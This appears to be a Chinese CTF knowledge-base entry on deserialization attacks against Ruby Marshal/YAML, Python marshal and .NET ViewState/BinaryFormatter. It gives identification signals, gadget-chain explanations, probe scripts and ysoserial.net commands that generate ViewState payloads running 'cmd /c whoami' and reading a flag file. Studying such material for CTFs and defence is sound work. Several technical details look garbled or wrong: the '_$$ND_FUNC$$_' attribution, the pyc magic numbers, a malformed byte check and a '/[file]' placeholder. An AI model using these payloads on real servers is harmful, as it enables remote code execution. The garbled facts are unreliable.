---
title: Ruby Marshal / Python Marshal / .NET 反序列化（跨语言 gadget）
category: web
tags: [deserialization, ruby, marshal, dotnet, gadget]
signals: [Cookie 或参数以 BAh7 开头, 数据以 \x04\x08 开头, 出现 Marshal.load 或 YAML.load 关键词, 响应体是 base64 且解码后为二进制, 报错提到 System.Web.UI.LosFormatter, 出现 Rack::Session::Cookie 或 Ruby on Rails, 题面出现 "ysoserial" 或 "_$$ND_FUNC$$_", 表单里 ViewState 字段, 提示 Rails 版本号]
difficulty: hard
source: "elttam / PayloadsAllTheThings / Microsoft"
tools: [python, ruby, ysoserial.net]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- Cookie / 参数值 base64 解码后是 `\x04\x08` 开头（Ruby Marshal）或 `\x80\x04` 开头（Python pickle，但 `marshal` 版本 `\xe3` 开头）。
- 页面出现 `Marshal.load(Base64.decode64(...))`、`YAML.load`、`Rack::Session::Cookie`。
- 报错栈里出现 `activesupport`、`rails`、`jsonapi-resources`、`Marshal.dump`。
- `.NET` 场景：请求里有 `__VIEWSTATE`、`__EVENTVALIDATION`、`text/xml` + `__type=`，或 `ObjectStateFormatter` / `LosFormatter` / `BinaryFormatter` 字样。
- 题面提示：`反序列化`、`序列化`、`Marshal`、`ViewState`、`ysoserial.net`。
- 源码里 `YAML.load(params[:data])` 或 `Marshal.load(...)` 直接吞外部输入。

## 二、原理

### 1. Ruby Marshal —— 无魔术方法，靠 gadget 链

Ruby 对象反序列化时**不会自动调用 `to_s`/`==` 之类**，所以利用必须找到一条"反序列化过程中被调用的方法链"：

- **`Gem::Requirement`**（RubyGems < 2.7.6 等）：
  `Marshal.load` 时会比较 `@requirements` 数组，若其中元素带 `@version`，会调用 `<=>`；构造 `Gem::Package::TarReader::Entry` + `Net::BufferedIO` 可把数据读进堆，再配 `Gem::Installer` 落地文件。
- **`YAML.load`（Psych）**：直接支持 `!ruby/object:` 标签，例如：

```yaml
--- !ruby/object:Gem::Installer
i: x
```

  Psych 在 3.1+ 默认 `safe_load`，但老版本/`YAML.load` 仍危险。
- **`_$$ND_FUNC$$_`**：这是 **NuGet** 的 `jQuery`/`Json.NET`（Newtonsoft）在 `TypeNameHandling.All` 下的 payload 标记，不是 Ruby。
- **通用 RCE 链（Elttam 2024）**：利用 Ruby 标准库里 `Net::WriteAdapter` + `Gem::RequestSet` + `Gem::Package::TarReader::Entry` 的 `syswrite`/`read` 组合，能把任意字节写进 `/[file]`，甚至 `load` 一个 Ruby 文件 → 实现 Ruby 3.x/4.x 的 Universal RCE。

### 2. Python marshal —— 反序列化的是**代码对象**，不是实例

`marshal.loads` 直接还原 `code` 对象，`exec` 后就运行。所以 Python 的"marshal 反序列化漏洞"通常出现在 `pyc` 反编译场景（参见 `kb/reverse/pyc-reverse.md`），web 侧更多是 **pickle**（见 `python-pickle-pyjail.md`）。此处只说明区别：`pickle` 走 `__reduce__`，`marshal` 不走任何用户可控逻辑，只能被 `exec` 执行，因此**构造 `code` 对象需要版本完全一致**（magic number 不同就炸）。

### 3. .NET —— ViewState 与 BinaryFormatter

- **ViewState**：`__VIEWSTATE` 是 base64 的 `ObjectStateFormatter` 序列化结果，末尾带 MAC（`Validation=HMAC`）。MAC 密钥泄漏或关闭 enableViewStateMac 时，可用 **ysoserial.net** 直接生成 `TypeConfuseDelegate` gadgets 把 `cmd` 塞进去。
- **BinaryFormatter**：`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Deserialize` 会在 `[OnDeserialized]` 回调里触发 gadget，`TextFormattingRunProperties` + `XamlReader.Parse` 是最稳定的 RCE。
- **LosFormatter / ObjectStateFormatter**：ASP.NET 老控件；`__VIEWSTATE` 走它。

## 三、解题步骤

1. **判格式**：
   - `\x04\x08` → Ruby Marshal；`\x80\x04` → Python pickle；`\xe3` / `\x42\x0d\x0d\x0a` → Python 3.8+ marshal；`/\w+=` base64 且长 → 可能是 ViewState。
2. **读源码/报错**：找 `Marshal.load`、`YAML.load`、`ObjectStateFormatter`、`BinaryFormatter` 调用点。
3. **确认 Ruby/session**：Rails 的 `_session` cookie 默认是 Marshal（`Rack::Session::Cookie`），有 `secret_key_base` 泄漏则可自签。
4. **Ruby 侧**：先用安全的 `Gem::Version` 测试是否能被 `Marshal.load`（看回显/报错），再用 gadget 链。参考 elttam 的 `universal_rce` 链。
5. **.NET 侧**：取 `__VIEWSTATE` 的 `machineKey`（web.config 泄漏）或直接利用弱 MAC；`ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path=/ --apppath=/ --islegacy`。
6. **落地**：回写 payload 到原参数，看命令执行结果。

## 四、可直接运行的脚本

Ruby：最小 Marshal 解析器（看清结构，方便手工改）：

```ruby
require 'pp'
data = Base64.decode64(ARGV[0])
obj = Marshal.load(data)
pp obj
```

Ruby：生成一个探针（确认 `Marshal.load` 被调用）：

```ruby
require 'base64'
payload = Marshal.dump({ "probe" => "yes" })
puts Base64.strict_encode64(payload)
```

Ruby：YAML 反序列化探针（看是否能加载任意类）：

```ruby
require 'yaml'
evil = "--- !ruby/object:OpenStruct\n table: {}\n"
puts YAML.load(evil).inspect rescue puts "blocked: #{$!}"
```

Python：识别并检查格式（marshal/pickle 区分）：

```python
import base64, marshal, pickletools, sys

b = base64.b64decode(sys.argv[1])
print("head:", b[:4].hex())

if b[:2] == b"\x80\x04":            # pickle proto 4
    pickletools.dis(b)
elif b[0] == 0xE3 or b[:4] == b"\x420\r\r\n":   # marshal (py3.8+)
    try:
        code = marshal.loads(b)
        print("marshal code object:", code.co_name, code.co_filename)
        import dis; dis.dis(code)
    except Exception as e:
        print("magic mismatch:", e)
```

.NET：ViewState payload 生成（ysoserial.net）：

```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties `
  -c "cmd /c type C:\flag.txt" `
  --path="/default.aspx" --apppath="/" --islegacy --generator=MCA `
  --validationkey="MACHINE_KEY_HEX" --validationalg="SHA1"
```

.NET：BinaryFormatter 探针（服务端代码，理解原理）：

```csharp
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

class P {
    static void Main(string[] a) {
        var bf = new BinaryFormatter();
        var obj = bf.Deserialize(File.OpenRead(a[0]));
        Console.WriteLine(obj);
    }
}
```

## 五、常见坑 / 变体

- **Ruby 版本敏感**：gadget 链对 2.7 / 3.0 / 3.1 / 3.2 / 3.3+ 的类名、方法签名不同，先 `ruby -v` 或从报错确认。
- **`safe_load` / `safe_mode`**：Rails 5.2+ 的 `Marshal.load` 在 `ActiveSupport` 里加了白名单，老链失效。
- **YAML 用 `Psych.safe_load`**：`allowed_classes: []` 会直接拒，必须找另一条 gadget。
- **ViewState MAC 开启**：没有 `machineKey` 就无解（除非 `--islegacy` + 弱算法）。
- **Python marshal 版本**：pyc magic 不匹配（`\x42\x0d` 是 3.8，`\x61\x0d` 是 3.11+），需同版本 Python 生成。
- **BCL 混淆**：.NET 混淆器把类型名改了 → 看 `[assembly:]` 与 `SerializationBinder`。
- **变体：Java 风格的 URLDNS 探针在 .NET 叫 `ObjectDataProvider` + `ResourceDictionary`**。
- **变体：gRPC / protobuf 反序列化**：Surface 小，主要看 `Any` 类型解析。
- **变体：PHP→Ruby 混合**：Cookie 是 `PHPSESSID` 但后端是 Ruby → 看框架指纹。

## 六、参考来源

- [Ruby Universal RCE Deserialization Gadget Chain — elttam](https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain)
- [PayloadsAllTheThings — Ruby 反序列化](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [Microsoft — Deserialization risks in use of BinaryFormatter](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)
- [Python 官方文档 — marshal 模块](https://docs.python.org/zh-cn/3.13/library/marshal.html)
- [HackTricks — Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)
